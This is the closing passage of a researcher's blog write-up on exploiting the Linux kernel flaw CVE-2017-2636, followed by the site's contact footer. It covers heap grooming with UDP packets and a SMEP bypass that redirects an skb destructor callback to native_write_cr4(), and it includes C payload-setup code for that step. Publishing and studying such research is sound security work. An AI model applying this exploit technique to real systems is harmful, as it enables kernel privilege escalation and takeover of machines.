+<p>Now we need to prepare the heap to the next round of <code class="language-plaintext highlighter-rouge">n_hdlc</code> racing. The <code class="language-plaintext highlighter-rouge">/proc/slabinfo</code> shows that <code class="language-plaintext highlighter-rouge">kmalloc-8192</code> slab stores only 4 objects, so double-free error has high chances to crash the allocator. But the following trick helps to avoid that and makes the exploit much more stable – send a dozen UDP packets to fill the partially emptied slabs.</p>
+
+<h2 id="smep-bypass">SMEP bypass</h2>
+
+<p>As I mentioned, the <code class="language-plaintext highlighter-rouge">root_it()</code> shellcode resides in the userspace. Executing it in the kernelspace is detected by <a href="http://vulnfactory.org/blog/2011/06/05/smep-what-is-it-and-how-to-beat-it-on-linux/">SMEP</a> (Supervisor Mode Execution Protection). It is an x86 feature, which is enabled by toggling the bit 20 of CR4 register.</p>
+
+<p>There are several approaches to defeat it, for example, Vitaly Nikolenko <a href="https://www.syscan360.org/slides/2016_SG_Vitaly_Nikolenko_Practical_SMEP_Bypass_Techniques.pdf">describes</a> how to switch off SMEP using stack pivoting ROP technique. It works great, but I didn't want to copy it blindly. So I've created another quite funny way to defeat SMEP without ROP. Please inform me if that approach is already known.</p>
+
+<p>In <a href="http://lxr.free-electrons.com/source/arch/x86/include/asm/special_insns.h"><code class="language-plaintext highlighter-rouge">arch/x86/include/asm/special_insns.h</code></a> I've found this function:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">native_write_cr4</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">val</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">printk</span><span class="p">(</span><span class="s">"wcr4: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+	<span class="n">asm</span> <span class="k">volatile</span><span class="p">(</span><span class="s">"mov %0,%%cr4"</span><span class="o">:</span> <span class="o">:</span> <span class="s">"r"</span> <span class="p">(</span><span class="n">val</span><span class="p">),</span> <span class="s">"m"</span> <span class="p">(</span><span class="n">__force_order</span><span class="p">));</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>It writes its first argument to CR4.</p>
+
+<p>Now let's look at <code class="language-plaintext highlighter-rouge">skb_release_data()</code>, which executes the hijacked <code class="language-plaintext highlighter-rouge">callback</code> in the Ring 0:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c">	<span class="k">if</span> <span class="p">(</span><span class="n">shinfo</span><span class="o">-&gt;</span><span class="n">tx_flags</span> <span class="o">&amp;</span> <span class="n">SKBTX_DEV_ZEROCOPY</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">struct</span> <span class="n">ubuf_info</span> <span class="o">*</span><span class="n">uarg</span><span class="p">;</span>
+
+		<span class="n">uarg</span> <span class="o">=</span> <span class="n">shinfo</span><span class="o">-&gt;</span><span class="n">destructor_arg</span><span class="p">;</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">uarg</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">)</span>
+			<span class="n">uarg</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">(</span><span class="n">uarg</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
+	<span class="p">}</span></code></pre></figure>
+
+<p>We see that the destructor <code class="language-plaintext highlighter-rouge">callback</code> takes <code class="language-plaintext highlighter-rouge">uarg</code> address as the first argument. And we control this address in the exploited <code class="language-plaintext highlighter-rouge">sk_buff</code>.</p>
+
+<p>So I've decided to write the address of <code class="language-plaintext highlighter-rouge">native_write_cr4()</code> to <code class="language-plaintext highlighter-rouge">ubuf_info.callback</code> and put <code class="language-plaintext highlighter-rouge">ubuf_info</code> item at the mmap'ed userspace address <code class="language-plaintext highlighter-rouge">0x406e0</code>, which is the correct value of CR4 with disabled SMEP.</p>
+
+<p>In that case SMEP is disabled on one CPU core without any ROP. However, now we need to win the race twice: first time to disable SMEP, second time to execute the shellcode. But it's not a problem for this particular exploit since it is fast and reliable.</p>
+
+<p>So let's initialize the payload a bit differently:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c">	<span class="cp">#define CR4_VAL	0x406e0lu
+</span>
+	<span class="kt">void</span> <span class="o">*</span><span class="n">target_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">CR4_VAL</span> <span class="o">&amp;</span> <span class="mh">0xfffff000lu</span><span class="p">);</span>
+
+	<span class="n">area</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="n">target_addr</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
+			<span class="n">MAP_FIXED</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">area</span> <span class="o">!=</span> <span class="n">target_addr</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">perror</span><span class="p">(</span><span class="s">"[-] mmap</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="n">uinfo_p</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ubuf_info</span> <span class="o">*</span><span class="p">)</span><span class="n">CR4_VAL</span><span class="p">;</span>
+	<span class="n">uinfo_p</span><span class="o">-&gt;</span><span class="n">callback</span> <span class="o">=</span> <span class="n">NATIVE_WRITE_CR4</span><span class="p">;</span>
+
+	<span class="n">info</span><span class="o">-&gt;</span><span class="n">destructor_arg</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">uinfo_p</span><span class="p">;</span>
+	<span class="n">info</span><span class="o">-&gt;</span><span class="n">tx_flags</span> <span class="o">=</span> <span class="n">SKBTX_DEV_ZEROCOPY</span><span class="p">;</span></code></pre></figure>
+
+<p>That SMEP bypass looks witty, but introduces one additional requirement - it needs bit 18 (OSXSAVE) of CR4 set to 1. Otherwise <code class="language-plaintext highlighter-rouge">target_addr</code> becomes 0 and <code class="language-plaintext highlighter-rouge">mmap()</code> fails, since mapping the zero page is not allowed.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Investigating of <code class="language-plaintext highlighter-rouge">CVE-2017-2636</code> and writing this article was a big fun for me. I want to thank <a href="https://www.ptsecurity.com/ww-en/">Positive Technologies</a> for giving me the opportunity to work on this research. I would really appreciate feedback. See my contacts below.</p>
+
+
+  </div><a class="u-url" href="/2017/03/24/CVE-2017-2636.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Contacts</h2>
+
+      <div class="footer-col footer-col-1">
+        <ul class="social-media-list">
+          
+            <li>
+              <a href="mailto:alex.popov@linux.com">
+                <span class="icon  icon--email">
+                  <svg fill="#828282" height="17px" width="17px" viewBox="0 0 24 24">
+                  <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
+                  <path d="M0 0h24v24H0z" fill="none"/>
+                  </svg>
+                </span>
+		<span class="username">alex.popov@linux.com</span>
+              </a>
+            </li>
+          
+
+          
+          <li>
+            <a href="https://twitter.com/a13xp0p0v"><span class="icon icon--twitter"><svg viewBox="0 0 16 16" width="16px" height="16px"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span><span class="username">a13xp0p0v</span></a>
+
+          </li>
+          
+
+	  
+          <li>
+            <a href="https://github.com/a13xp0p0v"><span class="icon icon--github"><svg viewBox="0 0 16 16" width="16px" height="16px"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span><span class="username">a13xp0p0v</span></a>
+
+          </li>
+          
+
+	  
+	  <li>
+	    <a href="https://t.me/a13xp0p0v">
+	      <span class="icon  icon--telegram">
+		  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#828282" class="bi bi-telegram" viewBox="0 0 16 16">
+		  <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8.287 5.906c-.778.324-2.334.994-4.666
+		  2.01-.378.15-.577.298-.595.442-.03.243.275.339.69.47l.175.055c.408.133.958.288
+		  1.243.294.26.006.549-.1.868-.32 2.179-1.471 3.304-2.214 3.374-2.23.05-.012.12-.026.166.016.047.041.042.12.037.141-.03.129-1.227
+		  1.241-1.846 1.817-.193.18-.33.307-.358.336a8.154 8.154 0 0 1-.188.186c-.38.366-.664.64.015
+		  1.088.327.216.589.393.85.571.284.194.568.387.936.629.093.06.183.125.27.187.331.236.63.448.997.414.214-.02.435-.22.547-.82.265-1.417.786-4.486.906-5.751a1.426
+		  1.426 0 0 0-.013-.315.337.337 0 0 0-.114-.217.526.526 0 0 0-.31-.093c-.3.005-.763.166-2.984 1.09z"/>
+		  </svg>
+	      </span>
+	      <span class="username">a13xp0p0v</span>
+	    </a>
+	  </li>
+          
+
+	  
+	  <li>
+	    <a href="https://www.linkedin.com/in/a13xp0p0v">
+	      <span class="icon  icon--linkedin">
+		  <svg viewBox="0 0 512 512" width="16px" height="16px">
+	          <path fill="#828282" d="M150.65,100.682c0,27.992-22.508,50.683-50.273,50.683c-27.765,0-50.273-22.691-50.273-50.683
+	          C50.104,72.691,72.612,50,100.377,50C128.143,50,150.65,72.691,150.65,100.682z M143.294,187.333H58.277V462h85.017V187.333z
+	          M279.195,187.333h-81.541V462h81.541c0,0,0-101.877,0-144.181c0-38.624,17.779-61.615,51.807-61.615
+	          c31.268,0,46.289,22.071,46.289,61.615c0,39.545,0,144.181,0,144.181h84.605c0,0,0-100.344,0-173.915
+	          s-41.689-109.131-99.934-109.131s-82.768,45.369-82.768,45.369V187.333z"/>
+	        </svg>
+	      </span>
+	      <span class="username">a13xp0p0v</span>
+	    </a>
+	  </li>
+          
+        </ul>
+      </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
